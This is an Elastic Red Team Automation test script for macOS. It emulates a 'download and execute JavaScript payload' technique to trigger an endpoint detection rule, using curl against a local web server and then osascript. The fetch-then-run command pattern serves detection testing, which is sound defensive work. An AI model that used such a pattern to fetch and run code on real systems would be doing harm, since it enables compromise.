# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

from . import common
from . import RtaMetadata
from time import sleep


metadata = RtaMetadata(
    uuid="9332cece-38b7-49e1-9f8d-e879913ffdfb",
    platforms=["macos"],
    endpoint=[
        {"rule_name": "Download and Execution of JavaScript Payload", "rule_id": "871f0c30-a7c5-40a5-80e3-a50c6714632f"}
    ],
    siem=[],
    techniques=["T1059"],
)


@common.requires_os(metadata.platforms)
def main():
    # Setup web server
    common.serve_web()

    common.log("Executing commands to download and execute JavaScript payload")
    common.execute(["curl", "http://127.0.0.1:8000/payload.js"], shell=True)
    sleep(1)
    common.execute(["osascript", "-l", "JavaScript", "&"], shell=True)


if __name__ == "__main__":
    exit(main())
